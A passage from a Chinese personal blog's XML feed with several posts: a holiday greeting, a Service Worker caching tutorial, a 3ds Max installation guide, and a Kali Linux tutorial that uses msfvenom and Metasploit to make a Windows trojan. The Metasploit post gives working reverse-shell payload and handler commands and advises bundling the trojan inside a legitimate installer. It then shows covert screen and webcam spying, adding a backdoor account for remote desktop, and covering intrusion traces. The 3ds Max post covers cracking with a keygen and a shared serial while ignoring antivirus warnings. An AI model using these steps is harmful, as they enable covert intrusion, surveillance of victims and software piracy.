    <content type="html"><![CDATA[<img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/100.jpg"><ul><li>正好赶上今年的平安夜，提前祝大家圣诞节快乐哦！(๑•̀ㅂ•́)و✧<a id="more"></a><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/sd.jpg"></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;img src=&quot;https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/100.jpg&quot;&gt;

&lt;ul&gt;
&lt;li&gt;正好赶上今年的平安夜，提前祝大家圣诞节快乐哦！(๑•̀ㅂ•́)و✧
    
    </summary>
    
    
      <category term="日记本" scheme="https://lovek.me/categories/%E6%97%A5%E8%AE%B0%E6%9C%AC/"/>
    
    
  </entry>
  
  <entry>
    <title>Kali Linux利用metasploit生成木马入侵Windows系统</title>
    <link href="https://lovek.me/av7/"/>
    <id>https://lovek.me/av7/</id>
    <published>2019-12-12T15:47:00.000Z</published>
    <updated>2020-03-14T16:42:01.684Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>写在前面：此木马试了很多方法都还是会被360安全卫士、腾讯安全管家等杀毒软件查杀，所以本文的木马不具备免杀功能，大神可自行研究。本文仅供参考学习，请勿用做非法用途，造成的一切后果自行承担。</p></blockquote><h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><p>入侵机器：Kali Linux 2019.4 64位<br>肉鸡：Windows 7 64位</p><a id="more"></a><h2 id="本机IP"><a href="#本机IP" class="headerlink" title="本机IP"></a>本机IP</h2><p>首先我们来看一下入侵机器的IP地址.<br>终端输入：ifconfig</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/1.png"><ul><li>图中红色方框内就是我们的入侵机器的IP了，下面会用到。</li></ul><h2 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h2><p>终端输入：msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.211.140 LPORT=4444 -f exe -o God.exe</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/2.png"><p>参数解释：</p><ul><li><p>-p:指定payload</p></li><li><p>LHOST:本机IP （这里入侵机器的IP为：”192.168.211.140”，根据使用ifconfig命令得出的IP地址自行更改）</p></li><li><p>LPORT:指定监听端口  (这里指定的监听端口为：4444)</p></li><li><p>-f:指定文件类型</p></li><li><p>-o:指定输出的木马文件名  (这里木马名叫做God，可随意更改)</p></li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/3.png"><ul><li>命令执行完毕后我们root目录下会生成一个名为God的exe程序文件，可想而知，这个便就是我们的木马文件了。</li></ul><h2 id="msfconsole监听"><a href="#msfconsole监听" class="headerlink" title="msfconsole监听"></a>msfconsole监听</h2><ol><li><p>终端输入：msfconsole</p></li><li><p>使用监听模块：use exploit/multi/handler</p></li><li><p>设置payload：set payload windows/meterpreter/reverse_tcp</p></li><li><p>设置入侵机kali linux的IP地址：set lhost 192.168.96.128 （ip要与生成木马时的ip一致）</p></li><li><p>设置监听端口：set lport 4444 (端口要与生成木马时的端口一致）</p></li></ol><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/4.png"><ol start="6"><li>开始监听：exploit</li></ol><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/5.png"><h2 id="肉鸡安装木马"><a href="#肉鸡安装木马" class="headerlink" title="肉鸡安装木马"></a>肉鸡安装木马</h2><ul><li>把刚刚生成的木马文件放到我们的肉鸡当中，可以使用捆绑软件将木马文件和我们的正常程序文件捆绑在一起，下面我们把刚刚生成的木马文件和360安全卫士捆绑在一起，因为没有做免杀360安全卫士报毒了，需要免杀的大神可自行研究。</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/6.png"><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/7.png"><ul><li>如果肉鸡是普通用户的电脑并且没有安装杀毒软件或是忽略了杀毒软件的提示的话，点开了被我们木马感染的应用程序，运行了正常应用程序的同时也运行了我们的木马文件，在不知不觉间就成为了我们的囊中之物。</li></ul><h2 id="控制肉鸡"><a href="#控制肉鸡" class="headerlink" title="控制肉鸡"></a>控制肉鸡</h2><p>如果肉鸡成功的运行了我们的木马文件并且我们入侵机Kali Linux在监听状态下的话，入侵机就会产生一个meterpreter会话，参考下图</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/8.png"><p>这时我们就可以对肉鸡进行控制了</p><ol><li>终端输入 sysinfo 可以获取到肉鸡的基本信息</li></ol><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/9.png"><ol start="2"><li>终端输入 screenshot 可以获取到肉鸡屏幕的截图，截图默认保存在root文件夹当中</li></ol><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/10.png"><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/11.png"><ol start="3"><li>终端输入 webcam_list 可以查看肉鸡有几个摄像头，如果肉鸡有摄像头的话终端输入 webcam_stream 可以获取到肉鸡摄像头视频</li></ol><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/12.png"><ul><li>由于这里的肉鸡是windons 7，没有摄像头，所以这里无法演示。</li></ul><p> 4.终端输入 dir 可以查看肉鸡上的文件</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/13.png"><ul><li>因为木马程序的位置是在桌面，所以获取到了桌面下的所有文件。</li></ul><p> 5.我们可以在肉鸡上启动某个程序，命令为 execute ，比如启动肉鸡上的计算器，终端输入 execute -f calc.exe ，回到肉鸡中，计算器已被启动</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/14.png"><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/15.png"><p> 6.终端输入 run vnc 可查看肉鸡的实时屏幕，并且被监视的肉鸡本身并不会发生任何变化，不知不觉间就被我们监视了</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/16.png"><p> 7.终端输入 shell 可以进入肉鸡的命令行，这里你可在对方的电脑上执行一些cmd命令，当然，我们的一系列操作普通用户是看不到的，命令行输入 ipconfig 查看一下肉鸡的IP，下面会用到。</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/17.png"><p> 8.终端输入 ps 可以看到肉鸡当前正在运行的程序，你可以用 run post/windows/manage/migrate 将进程迁移到其他程序，也可以将其他程序关闭</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/18.png"><p> 9.进入肉鸡的远程桌面，实现远程控制，首先开启肉鸡的3389远程桌面，终端输入 run getgui -e 即可开启</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/19.png"><p> 10.成功开启了肉鸡的3389远程桌面后我们在肉鸡上新建一个用来登陆远程桌面的帐户，终端输入 run getgui -u God -p 123456</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/20.png"><ul><li>这里新建了一个用户名为 God ，密码为 123456 的帐户</li></ul><p> 11.我们新建一个终端窗口，终端输入 rdesktop -u God -p 123456 192.168.211.132:3389 登录肉鸡远程桌面。命令中的God为刚刚创建的登录用户名，123456为刚刚创建的登录密码，192.168.96.129为肉鸡的IP地址，根据自己创建的帐户和肉鸡的IP自行更改</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/21.png"><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/22.png"><p>这个时候就可以像操作自己电脑一样操控肉鸡，你可以利用他做任何你想要做事情，如果做什么特殊的事情切记要记得清理一下入侵痕迹并且做好防御防止自己被反追踪，具体如何防御我就不细说了，这里只讲入侵，其余的请自行百度解决。</p><p> 12.终端输入输入 shutdown 可以强制将肉鸡电脑关机</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/23.png"><ul><li>回到肉鸡中可以看到肉鸡关机了</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/Windows/24.png"><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>metasploit这个渗透框架功能十分强大，这里只讲述了部分常用功能，更多的功能你们可以自行尝试。</li><li>这里不足之处就是这个木马不能免杀，安装有腾讯安全卫士或者360安全卫士的电脑能立马查杀出来。当然还有其他的免杀方式，或者也可以用powershell来达到免杀效果，杀毒软件一般是无法查杀的。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;写在前面：此木马试了很多方法都还是会被360安全卫士、腾讯安全管家等杀毒软件查杀，所以本文的木马不具备免杀功能，大神可自行研究。本文仅供参考学习，请勿用做非法用途，造成的一切后果自行承担。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;准备环境&quot;&gt;&lt;a href=&quot;#准备环境&quot; class=&quot;headerlink&quot; title=&quot;准备环境&quot;&gt;&lt;/a&gt;准备环境&lt;/h2&gt;&lt;p&gt;入侵机器：Kali Linux 2019.4 64位&lt;br&gt;肉鸡：Windows 7 64位&lt;/p&gt;
    
    </summary>
    
    
      <category term="创作集" scheme="https://lovek.me/categories/%E5%88%9B%E4%BD%9C%E9%9B%86/"/>
    
    
  </entry>
  
  <entry>
    <title>应用Service worker加快/离线访问博客</title>
    <link href="https://lovek.me/av6/"/>
    <id>https://lovek.me/av6/</id>
    <published>2019-12-01T11:23:00.000Z</published>
    <updated>2020-03-14T16:39:56.173Z</updated>
    
    <content type="html"><![CDATA[<img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/2.png"><p>有一个困扰 web 用户多年的难题——丢失网络连接。即使是世界上最好的 web app，如果下载不了它，也是非常糟糕的体验。如今虽然已经有很多种技术去尝试着解决这一问题。而随着<strong>离线页面</strong>的出现，一些问题已经得到了解决。有一个叫做 APP Cache 的 API 可以提供离线体验，但它的问题比较多。最重要的问题是，仍然没有一个好的统筹机制对资源缓存和自定义的网络请求进行控制。</p><a id="more"></a><h2 id="Service-worker"><a href="#Service-worker" class="headerlink" title="Service worker"></a>Service worker</h2><p>于是 HTML5 提出了 Service Worker，Service worker 提供了很多新的能力，使得 web app 拥有与 nativeapp 相同的离线体验、消息推送体验。</p><p>Service worker 是一段脚本，它有能力往我们的浏览器中写入缓存，过滤网络请求，将缓存内容作为网络响应结果输出。<br><strong>带来的效果是显而易见的：</strong></p><blockquote><p>1、当我们缓存了某些资源的时候，当我们再次请求该资源的时候，我们便可以使用缓存的内容，这样的话，就可以减少网络请求了，网站的打开速度明显提升。<br>2、如果我们将网站所需的资源缓存下来了以后，这个时候即使计算机没有网络，依然可以打开这个网站，即离线访问。</p></blockquote><h2 id="Service-worker-应用场景"><a href="#Service-worker-应用场景" class="headerlink" title="Service worker 应用场景"></a>Service worker 应用场景</h2><p>现在很流行基于 GitHub page 和 markdown 的静态 blog ，非常适合技术的思维和习惯，针对不同的语言都有一些优秀的静态 blog 系统出现，如 Jekyll/Ruby，Pelican/Python，Hexo/NodeJs ，由于静态内容的特性非常适合做缓存来加速页面的访问，就利用 Service worker 来实现加速，结果是除了 PageSpeed，CDN 这些常见的服务器和网络加速之外，通过客户端实现了更好的访问体验。</p><p>现在你可以试试<strong>剪断网线</strong>刷新一下这个可爱的博客。或者浏览器快捷键F12—&gt;点击Network—&gt;勾选offline（断网）刷新页面</p><h2 id="应用技巧"><a href="#应用技巧" class="headerlink" title="应用技巧"></a>应用技巧</h2><p><strong>注册 Service worker</strong><br>要安装 Service worker，你需要在你的页面上注册它。下面的代码会告诉浏览器你的 Service worker 脚本放在哪里</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">if</span> (navigator.serviceWorker) &#123;</span><br><span class="line">    <span class="comment">// 注册Service Worker scope表示作用的页面的path</span></span><br><span class="line">    <span class="comment">// register函数返回Promise</span></span><br><span class="line">    navigator.serviceWorker.register(<span class="string">'/service-worker.js'</span>,&#123;<span class="attr">scope</span>: <span class="string">'/'</span>&#125;) </span><br><span class="line">      .then(<span class="function"><span class="keyword">function</span> (<span class="params">registration</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(registration);</span><br><span class="line">      &#125;)</span><br><span class="line">      .catch(<span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.error(e);</span><br><span class="line">      &#125;)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Service Worker is not supported in this browser.'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>以上代码会先检测 Service worker 在浏览器中是否可用，可用的话一个 Service worker（/service-worker.js）将被注册，如果这个 Service worker 已经注册过了，浏览器这会忽略以上代码。<br><strong>{scope: ‘/‘}</strong> 表示 Service worker 作用的范围。<br>需要说明的是 service-worker.js 文件被放在这个域的根目录下，这意味着 service worker 是跟网站同源的。换句话说，这个 service worker 将会获取到这个域下的所有 fetch 事件。<br>如果 service worker 文件注册到 /example/service-worker.js ，那么 service worker 只能收到 /example/ 路径下的 fetch 事件（比如： /example/page1/, /example/page2/）。<br>如果 service worker 文件注册到根目录下 /service-worker.js ，同时 {scope: ‘/example’} ，那么 service worker 也只能收到 /example/ 路径下的 fetch 事件。</p><p>service-worker.js 文件，我建议是放在网站的跟目录下，scope 不作修改，这样 service worker 拥有最大的使用范围。</p><h2 id="安装-Service-worker"><a href="#安装-Service-worker" class="headerlink" title="安装 Service worker"></a>安装 Service worker</h2><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/LX/1.png"><p>关于这个 service-worker.js 怎么写，具体可以查看 API,<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API" target="_blank" rel="noopener">MDN Service Worker API</a>。</p><blockquote><p>注意：将 service-worker.js 放到域的根目录下哦，这样 Service worker 才能拥有最大的使用范围。</p></blockquote><p>现在你可以到 chrome://inspect/#service-workers 这里，检查 service worker 是否对你的网站启用了。<br>或者在 chrome://serviceworker-internals/ 中管理你的 Service worker 。<br>或者在浏览器的开发者工具中也可以详细的查看 service worker 的缓存。</p><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/LX/2.png"><h2 id="Service-worker-核心-API"><a href="#Service-worker-核心-API" class="headerlink" title="Service worker 核心 API"></a>Service worker 核心 API</h2><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/LX/3.png"><h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/LX/4.png"><p>install 是安装一个 service worker 缓存，使用方法可以是这样：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Set the callback for the install step</span></span><br><span class="line">self.addEventListener(<span class="string">'install'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Perform install steps</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在 install 的 callback 中，我们需要执行一下步骤：<br>1、开启一个缓存<br>2、缓存我们的文件<br>3、确定所有的资源是否要被缓存</p><h2 id="fetch"><a href="#fetch" class="headerlink" title="fetch"></a>fetch</h2><p>fetch 用来监听用户的网络请求，并给出回应。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">self.addEventListener(<span class="string">'fetch'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  event.respondWith(</span><br><span class="line">    caches.match(event.request)</span><br><span class="line">      .then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Cache hit - return response</span></span><br><span class="line">        <span class="keyword">if</span> (response) &#123;</span><br><span class="line">          <span class="keyword">return</span> response;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fetch(event.request);</span><br><span class="line">      &#125;</span><br><span class="line">    )</span><br><span class="line">  );</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="activate"><a href="#activate" class="headerlink" title="activate"></a>activate</h2><p>你的 Service worker 总会有要更新的时候。在那时，你需要按照一下步骤来更新：<br>1、更新你 service worker 的 JavaScript 文件。<br>2、更新后的 service worker 启动并触发 install 事件。<br>3、此时，当前页面生效的依然是老版本的 service worker ，新的 service worker 会进入“waitting”状态。<br>4、当页面关闭后，来的 service worker 会被干掉，新的 service worker 接管页面。<br>5、一旦新的 service worker 生效后会触发 active 事件。</p><p>一个典型的 activete 事件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">self.addEventListener(<span class="string">'activate'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123; </span><br><span class="line"><span class="comment">// 监听worker的activate事件</span></span><br><span class="line">  event.waitUntil( <span class="comment">// 延迟activate事件直到</span></span><br><span class="line">    caches.keys().then(<span class="function"><span class="keyword">function</span>(<span class="params">keys</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">Promise</span>.all(keys.map(<span class="function"><span class="keyword">function</span>(<span class="params">key, i</span>)</span>&#123; <span class="comment">// 清除旧版本缓存</span></span><br><span class="line">        <span class="keyword">if</span>(key !== CACHE_VERSION)&#123;</span><br><span class="line">          <span class="keyword">return</span> caches.delete(keys[i]);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;))</span><br><span class="line">    &#125;)</span><br><span class="line">  )</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="其他使用场景"><a href="#其他使用场景" class="headerlink" title="其他使用场景"></a>其他使用场景</h2><p>在网站 A 中，隐藏一个 iframe ，在这个 iframe 中注册一个 service worker ，这个 service worker 会缓存网站 B 所需的资源。<br>从未访问过网站 B，但网站已经在你的设备上预加载过了，一切仅仅因为你访问过网站 A。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"https://B.com/iframe.html"</span> <span class="attr">style</span>=<span class="string">"width: 0; height: 0; border: 0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML5 For Web Designers<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">if</span> (<span class="string">'serviceWorker'</span> <span class="keyword">in</span> navigator) &#123;</span></span><br><span class="line"><span class="actionscript">  navigator.serviceWorker.register(<span class="string">'/serviceworker.js'</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;img src=&quot;https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.2/dywj/2.png&quot;&gt;

&lt;p&gt;有一个困扰 web 用户多年的难题——丢失网络连接。即使是世界上最好的 web app，如果下载不了它，也是非常糟糕的体验。如今虽然已经有很多种技术去尝试着解决这一问题。而随着&lt;strong&gt;离线页面&lt;/strong&gt;的出现，一些问题已经得到了解决。有一个叫做 APP Cache 的 API 可以提供离线体验，但它的问题比较多。最重要的问题是，仍然没有一个好的统筹机制对资源缓存和自定义的网络请求进行控制。&lt;/p&gt;
    
    </summary>
    
    
      <category term="创作集" scheme="https://lovek.me/categories/%E5%88%9B%E4%BD%9C%E9%9B%86/"/>
    
    
  </entry>
  
  <entry>
    <title>3D Max安装</title>
    <link href="https://lovek.me/av5/"/>
    <id>https://lovek.me/av5/</id>
    <published>2019-11-23T12:33:00.000Z</published>
    <updated>2020-02-14T13:10:58.460Z</updated>
    
    <content type="html"><![CDATA[<h2 id="需要资源："><a href="#需要资源：" class="headerlink" title="需要资源："></a>需要资源：</h2><ul><li><strong>3D Max安装包</strong></li><li><strong>3D Max注册机</strong></li><li><strong>VRay渲染器（3D 必装）</strong> </li><li><strong>VRay破解工具</strong></li><li><strong>VRay汉化工具</strong><blockquote><p>本篇文章以<strong>2018年版</strong>的<strong>3D Max</strong>和<strong>VRay 3.6</strong>为例，在Windows 10系统上进行安装操作，其他版本安装过程可能略有不同。本文仅供参考。</p></blockquote></li></ul><a id="more"></a><ul><li>为了方便大家不用再去网上辛苦的找资源，本篇文章底部已附上所需软件的下载地址，只适用于64位操作系统，需要的可以前往下载。</li></ul><hr><h2 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h2><ul><li>下载完成并解压之后得到<strong>3D Max 2018</strong>和<strong>VRay 3.6</strong>两个文件。</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/1.jpg"><hr><h2 id="3D-Max-2018"><a href="#3D-Max-2018" class="headerlink" title="3D Max 2018"></a>3D Max 2018</h2><ul><li>首先我们先来安装3D Max 2018，吧3D Max解压到你的桌面上方便安装完成之后的整理。</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/2.jpg"><ul><li>打开我们刚解压出来的文件夹，得到3D Max安装主程序文件夹和一个注册机文件夹，部分电脑会报毒属于正常，我们忽略掉就好。</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/3.jpg"><ul><li>进入3D Max 2018文件夹里面有三个文件，我们先来安装一下3D Max的帮助，打开<strong>3Ds Max2018Help</strong>文件，记得要右键管理员身份运行，否则会报错。弹出图中窗口，点击那个<strong>Browse…</strong>来选择我们的安装路径，安装到你想要安装的磁盘，这里我安装到D盘。</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/4.jpg"><ul><li>在需要安装的磁盘里面新建一个文件夹，将它命名为<strong>3D Max2018</strong>，选择它并确定</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/5.jpg"><ul><li>选择好路径之后我们点击<strong>Extract</strong>开始安装，安装过程大约需要1~3分钟.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/6.jpg"><ul><li>安装完3D Max2018Help之后我们来解压3Dmax安装主程序，两个一模一样的安装包，随便打开那个都可以，切记要右键管理员方式运行，弹出图中窗口，点击”<strong>更改</strong>“选择路径.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/7.jpg"><ul><li>在刚刚安装3D MaxHelp的那个磁盘里再新建一个文件夹，命名为<strong>3D Max</strong>安装程序，(只要自己待会能找到可以随便命名)，选择它并确定.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/8.jpg"><ul><li>选择好路径后点击确定就会开始解压，此过程大约需要4~8分钟.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/9.jpg"><ul><li>解压完成之后一般会自动弹出3D Max的安装页面.</li><li>如果没弹出请依次打开：此电脑 ➡ (你安装的磁盘) ➡ 3D Max安装程序(刚刚解压时新建的文件名称) ➡ Autodesk_3ds_Max_2018_EFGJKPS_Win_64bit_dlm ➡ setup(记得右键管理员运行)</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/10.jpg"><ul><li>选择”<strong>安装</strong>“，点击”<strong>我接受</strong>“然后下一步，进入配置页面.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/11.jpg"><ul><li>这里点击”<strong>浏览</strong>“来选择安装路径，选择刚刚安装3D MaxHelp的那个磁盘，找到第一次新建的那个文件夹，就是名为3D Max2018的那个文件夹，选择它并确定，路径选择好之后我们直接点击安装。</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/12.jpg"><ul><li>程序会自动开始配置各种3D Max的文件，我这里是23个产品，安装的电脑不同安装的产品数量也不同，这里一般需要较长的时间，请<strong>不要中途取消</strong>，需要些耐心.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/13.jpg"><ul><li>安装成功之后出现下图，(如果之前电脑安装过3D Max可能会出现安装错误的情况，如果出现此类情况，这里不再详细讲解，请自行百度搜索错误原因)，不要点击立即启动，我们点击右上角的”<strong>X</strong>“号将这个窗口关掉.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/14.jpg"><ul><li>现在我们打开3D Max是英文状态，我们需要点击任务栏上面的win图标，从里面可以看到好多3D Max的图标，打开折叠，随便在一个3D Max的图标上右键➡更多➡打开文件位置.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/15.jpg"><ul><li>在弹出的文件夹里面找到名为<strong>3ds Max 2018 - Simplified Chinese</strong>的图标，把它拖到电脑桌面上去，删除桌面上原有的3D Max图标，吧刚刚从文件夹里面拖出来的那个图标右键重命名为<strong>3D Max 2018</strong>(或者选择它点击<strong>F2</strong>重命名也可以)，至此3D Max安装完成.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/16.jpg"><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/17.jpg"><hr><h2 id="3D-Max破解"><a href="#3D-Max破解" class="headerlink" title="3D Max破解"></a>3D Max破解</h2><ul><li>打开注册机文件夹，把里面的注册机拖到桌面上，然后我们打开3D Max 2018.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/18.jpg"><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/19.jpg"><ul><li>加载一会自动弹出下图激活窗口，我们选择输入序列号.(网上说这里要断网才能激活，经过测试这里并不需要断网，都是可以激活的)</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/20.jpg"><ul><li>这里点击激活按钮，不要点错了，如果点错了可以重新启动3D Max重新选择.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/21.jpg"><ul><li>这里填写序列号和产品密钥，分享大家一个序列号：<strong>666-69696969</strong> 产品密钥：<strong>128J1</strong>(序列号和产品密钥可多次使用，不用担心用不了，并且都是永久激活)</li><li>填写完整序列号和产品密钥之后我们点击下一步即可.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/22.jpg"><ul><li>注意！到了这一步我们就不要再操作了，在任务栏里面右键，选择任务管理器，把它打开，结束掉图中的两个程序。之后关掉任务管理器即可.</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/23.jpg"><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.1/24.jpg"><img 